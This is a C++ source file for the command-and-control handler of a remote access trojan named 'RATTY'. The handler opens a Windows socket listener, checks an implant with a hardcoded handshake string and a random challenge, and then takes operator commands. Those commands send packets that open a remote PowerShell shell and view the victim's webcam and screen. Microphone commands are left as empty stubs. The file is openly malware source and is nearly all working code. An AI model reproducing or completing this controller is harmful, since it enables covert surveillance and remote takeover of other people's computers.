#include <rathandler.hpp>

Handler::Handler(std::string lhost, int lport): LHOST(lhost), LPORT(lport) {
    rat_conn = INVALID_SOCKET;
    InitializeServer();
}

void Handler::InitializeServer() {
    WSADATA wsaData;
    SOCKET sock_server;

    sockaddr_in address;
    int addrlen = sizeof(address);
    const int PORT = LPORT;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[-] WSAStartup failed\n";
        return;
    }

    // Create socket
    sock_server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_server == INVALID_SOCKET) {
        std::cerr << "[-] Socket failed: " << WSAGetLastError() << "\n";
        WSACleanup();
        return;
    }

    // Bind
    address.sin_family = AF_INET;
    inet_pton(AF_INET, LHOST.c_str(), &address.sin_addr);
    address.sin_port = htons(PORT);

    if (bind(sock_server, (sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
        std::cerr << "[-] Bind failed: " << WSAGetLastError() << "\n";
        closesocket(sock_server);
        WSACleanup();
        return;
    }

    // Listen
    if (listen(sock_server, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "[-] Listen failed: " << WSAGetLastError() << "\n";
        closesocket(sock_server);
        WSACleanup();
        return;
    }

    std::cout << "Waiting for connection...\n";
    rat_conn = accept(sock_server, (sockaddr*)&address, &addrlen);
    if (rat_conn == INVALID_SOCKET) {
        std::cerr << "[-] Accept failed: " << WSAGetLastError() << "\n";
        closesocket(sock_server);
        WSACleanup();
        return;
    }

    std::cout << "[*] Incoming Connection. . ." << std::endl;
    Challenge();

    // enter user input mode
    Interact();
    CloseRat();

    closesocket(rat_conn);
    closesocket(sock_server);
    WSACleanup();
}

void Handler::Interact() {
    if (rat_conn == INVALID_SOCKET) {
        std::cerr << "[-] Socket Connection not Valid!" << "\n";
        return;
    }

    std::string input;
    while (input != "exit") {
        printf("RATTY >$ ");
        std::cin >> input;
        std::pair<std::string, MsgType> result = ProcessCommand(input);

        // create RatPacket and send it to rat_conn
        if (result.second != MsgType::NONE) {
            SendPacket(result.first, result.second);
        }
    }
}

std::pair<std::string, MsgType> Handler::ProcessCommand(const std::string& input) {
    if (input == "exit") return std::make_pair("exit", MsgType::NONE);

    if (input == "shell") {
        // enter interactive powershell session
        return std::make_pair("shell", MsgType::EXEC);
    } if (input == "mic_on") {
        // enable mic stream
    } if (input == "mic_off") {
        // disable mic stream
    } if (input == "camera_on") {
        // open a new window and display web-cam view
        return std::make_pair("camera_on", MsgType::CAMERA);
    } if (input == "screen_view") {
        // open a new window and display screenshot frames
        return std::make_pair("screen_view", MsgType::SCREEN);
    } else {
        std::cout << input << ": RATTY command not found" << std::endl;
        return std::make_pair("none", MsgType::NONE);
    }
}

std::string Handler::GenerateChallenge() {
    std::vector<int> nums;
    // A-Z
    for (int i = 65; i <= 91; ++i) nums.push_back(i);

    // shuffle reorders the elements in the given start|end range via RNG
    // std::mt19937 is a psuedo random RNG
    // std::random_device is a non-predictable RNG
    auto seed = std::random_device{}();
    auto rng = std::mt19937{seed};
    std::shuffle(nums.begin(), nums.end(), rng);

    std::string challenge;
    for (const int& num : nums) {
        challenge += (char)num;
    }
    return challenge;
}

bool Handler::Challenge() {
    if (rat_conn == INVALID_SOCKET) {
        std::cerr << "[-] Socket Connection not Valid!" << "\n";
        return false;
    }

    std::cout << "[*] Initiating Challenge. . ." << std::endl;

    char buffer[1024] = {0};
    int bytesReceived = recv(rat_conn, buffer, sizeof(buffer), 0);

    if (bytesReceived > 0) {
        std::cout << "[*] Recv Init Packet. . ." << std::endl;

        RatPacket initPacket(std::string(buffer, bytesReceived).c_str());
        std::string msg = initPacket.GetPacketMessage();

        if (msg == "imgettingratty" &&
            initPacket.GetType() == MsgType::INIT &&
            initPacket.Length() == msg.size()) {
            std::cout << "[*] Sending Challenge. . ." << std::endl;
            // send challenge
            std::string code = GenerateChallenge();
            RatPacket challPacket(code, MsgType::INIT);
            send(rat_conn, challPacket.Frame().c_str(), challPacket.SizeOf(), 0);

            // recv challenge reply
            std::cout << "[*] Viewing Challenge Reply. . ." << std::endl;
            char buffer[1024] = {0};
            bytesReceived = recv(rat_conn, buffer, sizeof(buffer), 0);

            if (bytesReceived > 0) {
                std::cerr << "[*] Reply Code: " << std::string(buffer, bytesReceived) << std::endl;
                std::string replyCode = RatPacket(std::string(buffer, bytesReceived).c_str()).GetPacketMessage();

                if (replyCode == code) {
                    // notify rat were established
                    std::cout << "[+] Established RAT Connection!" << std::endl;
                    RatPacket ackPacket("ratty", MsgType::INIT);
                    send(rat_conn, ackPacket.Frame().c_str(), ackPacket.SizeOf(), 0);
                    return true;
                }

                std::cerr << "[-] Invalid Reply Code! (" << replyCode << ")" << "\n";
                return false;
            }
            std::cerr << "[-] Recv no Data! (" << bytesReceived << ")" << "\n";
            return false;
        }
        std::cerr << "[-] Invalid Message!" << "\n";
        return false;
    }
    std::cerr << "[-] Recv no Data! (" << bytesReceived << ")" << "\n";
    return false;
}

void Handler::SendPacket(const std::string& data, const MsgType& type) {
    RatPacket packet(data, type);

    // send packet frame
    send(rat_conn, packet.Frame().c_str(), packet.SizeOf(), 0);

    char buffer[1024] = {0};
    int bytesReceived = recv(rat_conn, buffer, sizeof(buffer), 0);
    if (bytesReceived > 0) {
        std::cout << "Server response: " << std::string(buffer, bytesReceived) << "\n";
    }
}

void Handler::CloseRat() {
    std::cout << "[*] Notifying RAT of closing. . .\n";
    // send(rat_conn, msg, (int)strlen(msg), 0);
}